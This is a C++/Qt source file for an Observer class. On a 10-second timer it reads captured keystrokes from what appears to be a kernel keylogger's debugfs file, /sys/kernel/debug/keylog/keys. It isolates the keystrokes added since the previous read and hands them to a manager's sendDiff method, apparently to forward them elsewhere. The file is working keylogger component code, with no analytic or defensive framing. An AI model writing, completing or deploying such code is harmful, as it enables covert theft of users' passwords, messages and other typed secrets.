#include "Observer.h"
#include <QTimer>
#include <dtl/dtl.hpp>
#include <fstream> // std::ifstream
#include <iostream>

Observer::Observer(QObject* parent)
    : QObject(parent)

{
    QTimer* timer = new QTimer(this);
    connect(timer, SIGNAL(timeout()), this, SLOT(check()));
    timer->start(10000);
}

void Observer::check()
{

    std::ifstream is("/sys/kernel/debug/keylog/keys", std::ifstream::binary);
    std::string s1(std::istreambuf_iterator<char>(is), {});
    std::string s3 = s1;
    if (s2.length() < s1.length()) {
        std::cout << "s1 len " << s1.length() << " s2 len " << s2.length() << std::endl;

        s3 = s3.erase(s3.find(s2), s2.length());
        s2 = s1;
        // std::cout << s3;
        std::cout << "new diff__\n";
        manager.sendDiff(QString::fromStdString(s3));
    }
}
